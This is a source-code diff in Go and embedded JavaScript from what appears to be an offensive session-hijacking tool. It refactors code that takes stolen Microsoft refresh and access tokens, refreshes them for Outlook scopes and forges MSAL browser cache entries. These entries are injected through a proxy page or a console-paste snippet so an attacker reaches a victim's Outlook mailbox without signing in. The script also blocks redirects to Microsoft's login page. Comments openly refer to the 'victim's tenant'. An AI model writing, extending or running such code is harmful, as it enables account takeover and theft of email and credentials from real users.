@@ -572,11 +572,10 @@ type owaSession struct {
 	at     string
 	client *http.Client
 	mu     sync.Mutex
-	// MSAL cache injection — used to pre-populate the proxy origin's localStorage
-	// so MSAL finds valid tokens and never triggers loginRedirect.
-	msalAT     string // access token to inject
-	msalEmail  string // user email (preferred_username claim)
-	msalTenant string // tenant GUID
+	// Pre-computed MSAL localStorage entries (JSON object string).
+	// Written into the proxy HTML shim so MSAL finds valid tokens and
+	// never triggers loginRedirect at the proxy origin.
+	msalEntriesJSON string
 }
 
 var (
@@ -640,7 +639,9 @@ func (s *HttpServer) handleDCOpen(w http.ResponseWriter, r *http.Request) {
 	tgt.mu.Lock()
 	rt := tgt.RefreshToken
 	at := tgt.AccessToken
+	idt := tgt.IDToken
 	tenant := tgt.Tenant
+	email := tgt.Email
 	tgt.mu.Unlock()
 
 	if rt == "" && at == "" {
@@ -648,25 +649,49 @@ func (s *HttpServer) handleDCOpen(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Try OWA scope first, fall back to graph scope
+	// Extract OWA's MSAL clientId from the live boot HTML so MSAL validates
+	// the appid claim in the cached AT and doesn't fall back to loginRedirect.
+	owaClientID := extractOWAClientID(at)
+
+	// Refresh with OWA's specific clientId + scope so appid == owaClientID in the token.
 	owaAT := at
+	owaRT := rt
 	if rt != "" {
-		if a, _, err := RefreshForScope(rt, tenant, "https://outlook.office.com/.default offline_access"); err == nil {
-			owaAT = a
-		} else if a, _, err := RefreshForScope(rt, tenant, "https://graph.microsoft.com/.default offline_access"); err == nil {
-			owaAT = a
+		noEmail := "https://outlook.office.com/.default openid profile offline_access"
+		withEmail := "https://outlook.office.com/.default openid profile email offline_access"
+		refreshed := false
+		for _, sc := range []string{noEmail, withEmail} {
+			if a, nr, err := refreshForScopeWithClient(rt, tenant, owaClientID, sc); err == nil {
+				owaAT = a
+				if nr != "" {
+					owaRT = nr
+				}
+				refreshed = true
+				break
+			}
+		}
+		if !refreshed {
+			for _, sc := range []string{noEmail, withEmail} {
+				if a, nr, err := RefreshForScope(rt, tenant, sc); err == nil {
+					owaAT = a
+					if nr != "" {
+						owaRT = nr
+					}
+					break
+				}
+			}
 		}
 	}
 
+	// Pre-compute MSAL localStorage entries (same logic as buildOWAInjectSnippet).
+	// These are written into the proxy shim so MSAL finds valid cached tokens
+	// at the proxy origin and never calls loginRedirect.
+	msalEntriesJSON := buildMSALEntriesJSON(owaAT, owaRT, idt, tenant, email)
+
 	jar, _ := cookiejar.New(nil)
-	tgt.mu.Lock()
-	tgtEmail := tgt.Email
-	tgt.mu.Unlock()
 	sess := &owaSession{
-		at:         owaAT,
-		msalAT:     owaAT,
-		msalEmail:  tgtEmail,
-		msalTenant: tenant,
+		at:              owaAT,
+		msalEntriesJSON: msalEntriesJSON,
 	}
 	sess.client = &http.Client{
 		Jar:     jar,
@@ -883,61 +908,42 @@ if(!window.crypto||!window.crypto.subtle){
     }
   }catch(e){}
 }());
-/* ── MSAL token cache pre-injection ──────────────────────────────────────────
-   Populate localStorage with real token entries (server refreshed) so MSAL
-   never triggers loginRedirect at the proxy origin.
+/* ── MSAL token cache — server-pre-computed entries ──────────────────────────
+   Computed server-side (same logic as the manual inject flow) so the keys,
+   scope strings, and clientId all match exactly what OWA's MSAL expects.
+   Written AFTER the nuclear wipe so stale entries can't interfere.
    ──────────────────────────────────────────────────────────────────────────── */
 (function(){
-  var _AT=%q;
-  var _email=%q;
-  var _tenant=%q;
-  if(!_AT)return;
-  function _jc(t){try{var p=t.split('.');if(p.length<2)return{};var b=p[1].replace(/-/g,'+').replace(/_/g,'/');while(b.length%%4)b+='=';return JSON.parse(atob(b))||{};}catch(e){return{};}}
-  var cl=_jc(_AT);
-  var oid=cl.oid||cl.sub||'uid';
-  var tid=cl.tid||_tenant||'common';
-  var upn=cl.preferred_username||cl.upn||_email||'';
-  var nm=cl.name||upn;
-  var exp=cl.exp||Math.floor(Date.now()/1000)+3600;
-  var now=Math.floor(Date.now()/1000);
-  var haid=oid+'.'+tid;
-  var env='login.microsoftonline.com';
-  var acctKey=haid+'-'+env+'-'+tid;
-  var sc='https://outlook.office.com/.default';
-  // Inject account entry (safe: nuclear wipe already ran above)
-  try{localStorage.setItem('msal.account.keys',JSON.stringify([acctKey]));}catch(e){}
-  try{localStorage.setItem(acctKey,JSON.stringify({homeAccountId:haid,environment:env,tenantId:tid,username:upn,localAccountId:oid,name:nm,authorityType:'MSSTS',clientInfo:btoa(JSON.stringify({uid:oid,utid:tid})).replace(/=/g,'')}));}catch(e){}
-  // Intercept setItem: learn MSAL clientId the moment it writes token.keys.*
-  var _si=Storage.prototype.setItem;
-  Storage.prototype.setItem=function(k,v){
-    _si.call(this,k,v);
-    if(typeof k==='string'&&k.startsWith('msal.token.keys.')){
-      var cid=k.slice(16);if(!cid)return;
-      var atk=haid+'-'+env+'-accesstoken-'+cid+'-'+tid+'-'+sc;
-      try{_si.call(this,atk,JSON.stringify({homeAccountId:haid,environment:env,clientId:cid,credentialType:'AccessToken',secret:_AT,cachedAt:String(now),expiresOn:String(exp),extendedExpiresOn:String(exp+3600),target:sc,tokenType:'Bearer',realm:tid}));}catch(e){}
-      // Patch the token.keys index to include our AT key
-      try{var kv=JSON.parse(v)||{};if(!Array.isArray(kv.accessToken))kv.accessToken=[];if(kv.accessToken.indexOf(atk)===-1)kv.accessToken.push(atk);if(!Array.isArray(kv.idToken))kv.idToken=[];if(!Array.isArray(kv.refreshToken))kv.refreshToken=[];_si.call(this,k,JSON.stringify(kv));}catch(e){}
-    }
-  };
-  // Intercept window.msal global to patch PublicClientApplication prototype
-  try{Object.defineProperty(window,'msal',{
-    set:function(v){
-      if(v&&v.PublicClientApplication){
-        var _p=v.PublicClientApplication.prototype;
-        _p.loginRedirect=function(){console.warn('[xt] loginRedirect blocked');return Promise.resolve(null);};
-        _p.loginPopup=function(){return Promise.reject(new Error('blocked'));};
-        var _ats=_p.acquireTokenSilent;
-        _p.acquireTokenSilent=function(req){
-          var self=this;
-          if(_ats){return _ats.call(self,req).catch(function(){return Promise.resolve({accessToken:_AT,tokenType:'Bearer',scopes:req&&req.scopes?req.scopes:[sc],account:self.getAllAccounts&&self.getAllAccounts()[0]||null,fromCache:true,expiresOn:new Date(exp*1000)});});}
-          return Promise.resolve({accessToken:_AT,tokenType:'Bearer',scopes:req&&req.scopes?req.scopes:[sc],account:null,fromCache:true,expiresOn:new Date(exp*1000)});
-        };
-      }
-      window.__msal__=v;
-    },
-    get:function(){return window.__msal__;},
-    configurable:true
+  var _d=%s;
+  if(!_d)return;
+  try{Object.keys(_d).forEach(function(k){
+    var v=typeof _d[k]==='string'?_d[k]:JSON.stringify(_d[k]);
+    try{localStorage.setItem(k,v);}catch(e){}
   });}catch(e){}
+}());
+/* ── Hard loginRedirect block ────────────────────────────────────────────────
+   OWA's MSAL must never navigate to login.microsoftonline.com from this origin.
+   The redirect_uri the proxy registers is not in Microsoft's allow-list for the
+   OWA app registration, so auth would fail anyway.  Block at the Location level
+   so even if cache lookup misses, no redirect escapes.
+   ──────────────────────────────────────────────────────────────────────────── */
+(function(){
+  function _isAuthUrl(u){return typeof u==='string'&&u.indexOf('login.microsoftonline.com')!==-1;}
+  /* Block Location.prototype.assign and .replace */
+  try{
+    var _lp=Location.prototype;
+    var _oa=_lp.assign,_or=_lp.replace;
+    _lp.assign=function(u){if(_isAuthUrl(u)){console.warn('[xt] blocked assign→',u);return;}return _oa.call(this,u);};
+    _lp.replace=function(u){if(_isAuthUrl(u)){console.warn('[xt] blocked replace→',u);return;}return _or.call(this,u);};
+  }catch(e){}
+  /* Block location.href setter */
+  try{
+    var _ld=Object.getOwnPropertyDescriptor(Location.prototype,'href');
+    if(_ld&&_ld.set){Object.defineProperty(Location.prototype,'href',{get:_ld.get,set:function(u){if(_isAuthUrl(u)){console.warn('[xt] blocked href→',u);return;}return _ld.set.call(this,u);},configurable:true});}
+  }catch(e){}
+  /* Block window.open to login.microsoftonline.com (popup auth) */
+  var _wo=window.open;
+  window.open=function(u,n,f){if(_isAuthUrl(u)){console.warn('[xt] blocked window.open→',u);return null;}return _wo.call(window,u,n,f);};
 }());
 /* ── Storage.prototype.getItem guard: ensure ALL msal.*.keys reads return arrays ──
    Covers both msal.token.keys.* AND msal.account.keys* ── */
@@ -1001,7 +1007,7 @@ window.fetch=function(u,o){return _fetch(_fix(u),o);};
 var _xo=XMLHttpRequest.prototype.open;
 XMLHttpRequest.prototype.open=function(m,u){return _xo.apply(this,[m,(typeof u==='string'&&_hosts.test(u))?_base+'/__x__/'+encodeURIComponent(u):u].concat(Array.prototype.slice.call(arguments,2)));};
 })();
-</script>`, sess.msalAT, sess.msalEmail, sess.msalTenant, proxyBase)
+</script>`, sess.msalEntriesJSON, proxyBase)
 		// Case-insensitive head injection — OWA HTML may use uppercase <HEAD>
 		lower := strings.ToLower(string(rawBody))
 		if idx := strings.Index(lower, "<head"); idx >= 0 {
@@ -1303,266 +1309,63 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Extract OWA client ID first so we can use it in the token refresh.
-	// This ensures the token's appid claim matches what OWA's MSAL expects.
+	// Refresh AT with OWA's specific clientId so appid matches MSAL config.
 	owaClientID := extractOWAClientID(at)
-
-	// Get an OWA-scoped access token refreshed with OWA's own client ID so
-	// the returned token has appid == owaClientID (MSAL validates this).
 	owaAT := at
 	owaRT := rt
 	if rt != "" {
-		// Try exact OWA MSAL v4.28.2 scope (no email) first, then with email as fallback.
-		noEmailScope := "https://outlook.office.com/.default openid profile offline_access"
-		emailScope := "https://outlook.office.com/.default openid profile email offline_access"
+		noEmail := "https://outlook.office.com/.default openid profile offline_access"
+		withEmail := "https://outlook.office.com/.default openid profile email offline_access"
 		refreshed := false
-		for _, tryScope := range []string{noEmailScope, emailScope} {
-			if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID, tryScope); err == nil {
+		for _, sc := range []string{noEmail, withEmail} {
+			if a, nr, err := refreshForScopeWithClient(rt, tenant, owaClientID, sc); err == nil {
 				owaAT = a
-				if newRT != "" {
-					owaRT = newRT
+				if nr != "" {
+					owaRT = nr
 				}
 				refreshed = true
 				break
 			}
 		}
 		if !refreshed {
-			// FOCI fallback — try without OWA-specific clientId
-			for _, tryScope := range []string{noEmailScope, emailScope} {
-				if a, newRT, err := RefreshForScope(rt, tenant, tryScope); err == nil {
+			for _, sc := range []string{noEmail, withEmail} {
+				if a, nr, err := RefreshForScope(rt, tenant, sc); err == nil {
 					owaAT = a
-					if newRT != "" {
-						owaRT = newRT
+					if nr != "" {
+						owaRT = nr
 					}
 					break
 				}
 			}
 		}
 	}
+	_ = owaRT // used in warm-up below
 
-	// Extract claims from ID token, fall back to access token
-	claims := decodeJWTClaims(idt)
-	if claims == nil {
-		claims = decodeJWTClaims(owaAT)
-	}
-
-	oid := jwtStr(claims, "oid")
-	tid := jwtStr(claims, "tid")
-	if tid == "" {
-		tid = tenant
-	}
-	upn := jwtStr(claims, "preferred_username")
-	if upn == "" {
-		upn = jwtStr(claims, "upn")
-	}
-	if upn == "" {
-		upn = email
-	}
-	name := jwtStr(claims, "name")
-	if name == "" {
-		name = upn
-	}
-
-	// Build MSAL v2 home account ID
-	homeAccountID := strings.ToLower(oid + "." + tid)
-	env := "login.microsoftonline.com"
-
-	// Build client_info (base64url of {"uid":"oid","utid":"tid"})
-	ciRaw, _ := json.Marshal(map[string]string{"uid": oid, "utid": tid})
-	clientInfo := base64.RawURLEncoding.EncodeToString(ciRaw)
-
-	// OWA MSAL uses individual scopes, not /.default.
-	// We write cache entries for many scope variants — MSAL sorts scopes alphabetically
-	// when creating cache keys, so the lookup must match exactly.
-	// From the authorize URL: scope=https://outlook.office.com/.default openid profile offline_access
-	// Sorted alphabetically: https://outlook.office.com/.default offline_access openid profile
-	scopeFromToken := jwtStr(claims, "scp") // e.g. "Mail.ReadWrite Calendars.ReadWrite openid profile email offline_access"
-	scopeVariants := []string{
-		// Exact scope from OWA MSAL v4.28.2 authorize request (no email):
-		"https://outlook.office.com/.default openid profile offline_access",
-		// Sorted (MSAL normalizes scope order in cache keys):
-		"https://outlook.office.com/.default offline_access openid profile",
-		// Variants with email (older OWA / device code scope):
-		"https://outlook.office.com/.default openid profile email offline_access",
-		"https://outlook.office.com/.default offline_access openid profile email",
-		"email https://outlook.office.com/.default offline_access openid profile",
-		"openid profile email offline_access https://outlook.office.com/.default",
-	}
-	if scopeFromToken != "" {
-		scopeVariants = append(scopeVariants, scopeFromToken)
-		// Also try with full resource prefix on each short scope
-		var fullScopes []string
-		for _, s := range strings.Fields(scopeFromToken) {
-			if !strings.Contains(s, "/") {
-				fullScopes = append(fullScopes, "https://outlook.office.com/"+s)
-			} else {
-				fullScopes = append(fullScopes, s)
-			}
+	// Derive display fields for the HTML template (upn, homeAccountID, owaClientID already set).
+	var upn, homeAccountID string
+	{
+		cl := decodeJWTClaims(idt)
+		if cl == nil {
+			cl = decodeJWTClaims(owaAT)
 		}
-		scopeVariants = append(scopeVariants, strings.Join(fullScopes, " "))
-	}
-	// Primary scope for the main cache entry
-	scope := scopeVariants[0]
-	if scopeFromToken != "" {
-		scope = scopeFromToken
-	}
-
-	now := fmt.Sprintf("%d", time.Now().Unix())
-	exp := fmt.Sprintf("%d", time.Now().Unix()+3600)
-	extExp := fmt.Sprintf("%d", time.Now().Unix()+86400)
-
-	// MSAL v2 cache key format (all lowercase, separator "-"):
-	//   account : {homeAccountId}-{env}-{realm}
-	//   at      : {homeAccountId}-{env}-accesstoken-{clientId}-{realm}-{target}--
-	//   rt      : {homeAccountId}-{env}-refreshtoken-{clientId}--{target}--
-	//   idt     : {homeAccountId}-{env}-idtoken-{clientId}-{realm}--
-	accountKey := strings.ToLower(fmt.Sprintf("%s-%s-%s", homeAccountID, env, tid))
-	atKey := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, owaClientID, tid, scope))
-	rtKey := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, owaClientID, scope))
-	idtKey := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, owaClientID, tid))
-
-	idtClaimsJSON, _ := json.Marshal(claims)
-
-	accountVal := map[string]interface{}{
-		"authorityType":  "MSSTS",
-		"clientInfo":     clientInfo,
-		"environment":    env,
-		"homeAccountId":  homeAccountID,
-		"idTokenClaims":  json.RawMessage(idtClaimsJSON),
-		"localAccountId": oid,
-		"nativeAccountId": "",
-		"name":           name,
-		"realm":          tid,
-		"username":       upn,
-		// MSAL v4 requires tenantProfiles as an object keyed by tenantId, not an array.
-		"tenantProfiles": map[string]interface{}{
-			tid: map[string]interface{}{
-				"tenantId":       tid,
-				"localAccountId": oid,
-				"name":           name,
-				"isHomeTenant":   true,
-			},
-		},
-	}
-	atVal := map[string]interface{}{
-		"cachedAt":          now,
-		"clientId":          owaClientID,
-		"credentialType":    "AccessToken",
-		"environment":       env,
-		"expiresOn":         exp,
-		"extendedExpiresOn": extExp,
-		"homeAccountId":     homeAccountID,
-		"realm":             tid,
-		"secret":            owaAT,
-		"target":            scope,
-		"tokenType":         "Bearer",
-	}
-	rtVal := map[string]interface{}{
-		"clientId":       owaClientID,
-		"credentialType": "RefreshToken",
-		"environment":    env,
-		"homeAccountId":  homeAccountID,
-		"secret":         owaRT,
-		"target":         scope,
-	}
-	idtVal := map[string]interface{}{
-		"clientId":       owaClientID,
-		"credentialType": "IdToken",
-		"environment":    env,
-		"homeAccountId":  homeAccountID,
-		"realm":          tid,
-		"secret":         idt,
-	}
-
-	entries := map[string]interface{}{
-		accountKey: accountVal,
-		atKey:      atVal,
-		rtKey:      rtVal,
-		idtKey:     idtVal,
-	}
-
-	// Build the full set of clientIds to cover — extracted + all known variants.
-	// OWA changed clientId in 2025 to 9199bf20; writing for all ensures we hit
-	// whichever version is currently deployed on the victim's tenant.
-	allClientIDs := []string{owaClientID}
-	for _, kid := range owaKnownClientIDs {
-		if kid != owaClientID {
-			allClientIDs = append(allClientIDs, kid)
+		o := jwtStr(cl, "oid")
+		t2 := jwtStr(cl, "tid")
+		if t2 == "" {
+			t2 = tenant
 		}
+		u := jwtStr(cl, "preferred_username")
+		if u == "" {
+			u = jwtStr(cl, "upn")
+		}
+		if u == "" {
+			u = email
+		}
+		upn = u
+		homeAccountID = strings.ToLower(o + "." + t2)
 	}
 
-	// Write AT/RT/IDT cache entries for every (clientId × scope) combination.
-	for _, cid := range allClientIDs {
-		for _, sv := range scopeVariants {
-			ck := strings.ToLower(fmt.Sprintf("%s-%s-accesstoken-%s-%s-%s--", homeAccountID, env, cid, tid, sv))
-			rk := strings.ToLower(fmt.Sprintf("%s-%s-refreshtoken-%s--%s--", homeAccountID, env, cid, sv))
-			ik := strings.ToLower(fmt.Sprintf("%s-%s-idtoken-%s-%s--", homeAccountID, env, cid, tid))
-			if _, exists := entries[ck]; !exists {
-				entries[ck] = map[string]interface{}{
-					"cachedAt": now, "clientId": cid, "credentialType": "AccessToken",
-					"environment": env, "expiresOn": exp, "extendedExpiresOn": extExp,
-					"homeAccountId": homeAccountID, "realm": tid, "secret": owaAT,
-					"target": sv, "tokenType": "Bearer",
-				}
-			}
-			if _, exists := entries[rk]; !exists {
-				entries[rk] = map[string]interface{}{
-					"clientId": cid, "credentialType": "RefreshToken",
-					"environment": env, "homeAccountId": homeAccountID,
-					"secret": owaRT, "target": sv,
-				}
-			}
-			if _, exists := entries[ik]; !exists {
-				entries[ik] = map[string]interface{}{
-					"clientId": cid, "credentialType": "IdToken",
-					"environment": env, "homeAccountId": homeAccountID,
-					"realm": tid, "secret": idt,
-				}
-			}
-		}
-	}
-
-	// MSAL requires msal.account.keys AND msal.token.keys.{clientId} as indices.
-	// Without the token-keys index MSAL ignores all cached credentials and
-	// redirects to interactive login. Write the index for every known clientId.
-	entries["msal.account.keys"] = []string{accountKey}
-
-	// Build credential key lists per clientId for the token-keys index.
-	// Must use pre-initialized slices so nil serializes as [] not null —
-	// OWA's migrateIdTokens calls .find() on idToken and crashes on null.
-	for _, cid := range allClientIDs {
-		cAtKeys := []string{}
-		cRtKeys := []string{}
-		cIdtKeys := []string{}
-		for k, v := range entries {
-			vm, ok := v.(map[string]interface{})
-			if !ok {
-				continue
-			}
-			if vm["clientId"] != cid {
-				continue
-			}
-			switch vm["credentialType"] {
-			case "AccessToken":
-				cAtKeys = append(cAtKeys, k)
-			case "RefreshToken":
-				cRtKeys = append(cRtKeys, k)
-			case "IdToken":
-				cIdtKeys = append(cIdtKeys, k)
-			}
-		}
-		entries["msal.token.keys."+cid] = map[string]interface{}{
-			"accessToken":  cAtKeys,
-			"idToken":      cIdtKeys,
-			"refreshToken": cRtKeys,
-		}
-	}
-	// Clear any stale interaction-in-progress flag that blocks silent auth.
-	entries["msal.interaction.status"] = ""
-	// MSAL v4 SSO hint entries — used by getAllAccounts and ssoSilent matching
-	entries["msal.last.auth.uid"] = oid
-	entries["msal.last.auth.utid"] = tid
-	entries["msal.last.uid.info."+tid] = oid
+	// Build full MSAL cache entries using shared helper.
+	entriesJSON := buildMSALEntriesJSON(owaAT, owaRT, idt, tenant, email)
 
 	// ── Server-side OWA warm-up.
 	// OWA now lives at outlook.cloud.microsoft (2025+); outlook.office.com
@@ -1612,7 +1415,6 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	//   2. Write MSAL v2 cache to localStorage + sessionStorage
 	//   3. Reload → fully logged in
 	var js strings.Builder
-	entriesJSON, _ := json.Marshal(entries)
 	js.WriteString("(function(){\n")
 	// Patch localStorage.getItem so msal.token.keys.* always returns valid arrays.
 	// Stale entries written by older broken injects had null arrays; MSAL's
@@ -1861,34 +1663,35 @@ var iv = setInterval(function(){
 	)
 }
 
-// buildOWAInjectSnippet performs the token exchange and builds the MSAL cache
-// inject script. Extracted so handleDCEvil can share the logic without duplicating
-// the full handleDCInject HTML scaffolding.
-func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
+// buildMSALEntriesJSON computes the full MSAL v4 localStorage entry map for a
+// given set of tokens, returning it as a JSON object string ready for embedding
+// in a <script> tag.  Shared by the OWA proxy shim (handleDCOWA) and the manual
+// inject snippet (buildOWAInjectSnippet / handleDCEvil).
+func buildMSALEntriesJSON(at, rt, idt, tenant, email string) string {
 	owaClientID := extractOWAClientID(at)
 
 	owaAT := at
 	owaRT := rt
 	if rt != "" {
-		noEmailScope := "https://outlook.office.com/.default openid profile offline_access"
-		emailScope := "https://outlook.office.com/.default openid profile email offline_access"
+		noEmail := "https://outlook.office.com/.default openid profile offline_access"
+		withEmail := "https://outlook.office.com/.default openid profile email offline_access"
 		refreshed := false
-		for _, tryScope := range []string{noEmailScope, emailScope} {
-			if a, newRT, err := refreshForScopeWithClient(rt, tenant, owaClientID, tryScope); err == nil {
+		for _, sc := range []string{noEmail, withEmail} {
+			if a, nr, err := refreshForScopeWithClient(rt, tenant, owaClientID, sc); err == nil {
 				owaAT = a
-				if newRT != "" {
-					owaRT = newRT
+				if nr != "" {
+					owaRT = nr
 				}
 				refreshed = true
 				break
 			}
 		}
 		if !refreshed {
-			for _, tryScope := range []string{noEmailScope, emailScope} {
-				if a, newRT, err := RefreshForScope(rt, tenant, tryScope); err == nil {
+			for _, sc := range []string{noEmail, withEmail} {
+				if a, nr, err := RefreshForScope(rt, tenant, sc); err == nil {
 					owaAT = a
-					if newRT != "" {
-						owaRT = newRT
+					if nr != "" {
+						owaRT = nr
 					}
 					break
 				}
@@ -1950,16 +1753,16 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	idtClaimsJSON, _ := json.Marshal(claims)
 
 	accountVal := map[string]interface{}{
-		"authorityType":   "MSSTS",
-		"clientInfo":      clientInfo,
-		"environment":     env,
-		"homeAccountId":   homeAccountID,
-		"idTokenClaims":   json.RawMessage(idtClaimsJSON),
-		"localAccountId":  oid,
+		"authorityType":  "MSSTS",
+		"clientInfo":     clientInfo,
+		"environment":    env,
+		"homeAccountId":  homeAccountID,
+		"idTokenClaims":  json.RawMessage(idtClaimsJSON),
+		"localAccountId": oid,
 		"nativeAccountId": "",
-		"name":            name,
-		"realm":           tid,
-		"username":        upn,
+		"name":           name,
+		"realm":          tid,
+		"username":       upn,
 		"tenantProfiles": map[string]interface{}{
 			tid: map[string]interface{}{
 				"tenantId":       tid,
@@ -1969,6 +1772,7 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 			},
 		},
 	}
+
 	entries := map[string]interface{}{
 		accountKey: accountVal,
 		atKey: map[string]interface{}{
@@ -2025,7 +1829,6 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 		}
 	}
 
-	// Build token-key indices per clientId
 	entries["msal.account.keys"] = []string{accountKey}
 	entries["msal.interaction.status"] = ""
 	entries["msal.last.auth.uid"] = oid
@@ -2036,12 +1839,20 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 		cAtKeys := []string{}
 		cRtKeys := []string{}
 		cIdtKeys := []string{}
-		for k := range entries {
-			if strings.Contains(k, "-accesstoken-"+cid+"-") {
+		for k, v := range entries {
+			vm, ok := v.(map[string]interface{})
+			if !ok {
+				continue
+			}
+			if vm["clientId"] != cid {
+				continue
+			}
+			switch vm["credentialType"] {
+			case "AccessToken":
 				cAtKeys = append(cAtKeys, k)
-			} else if strings.Contains(k, "-refreshtoken-"+cid+"-") {
+			case "RefreshToken":
 				cRtKeys = append(cRtKeys, k)
-			} else if strings.Contains(k, "-idtoken-"+cid+"-") {
+			case "IdToken":
 				cIdtKeys = append(cIdtKeys, k)
 			}
 		}
@@ -2052,7 +1863,15 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 		}
 	}
 
-	entriesJSON, _ := json.Marshal(entries)
+	b, _ := json.Marshal(entries)
+	return string(b)
+}
+
+// buildOWAInjectSnippet builds the MSAL cache inject script for the manual
+// console-paste flow.  Token exchange and entry computation are now shared via
+// buildMSALEntriesJSON to avoid duplication with the proxy shim path.
+func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
+	entriesJSON := buildMSALEntriesJSON(at, rt, idt, tenant, email)
 	var js strings.Builder
 	js.WriteString("(function(){\n")
 	// Guard msal.token.keys.* AND msal.account.keys against null/non-array values.
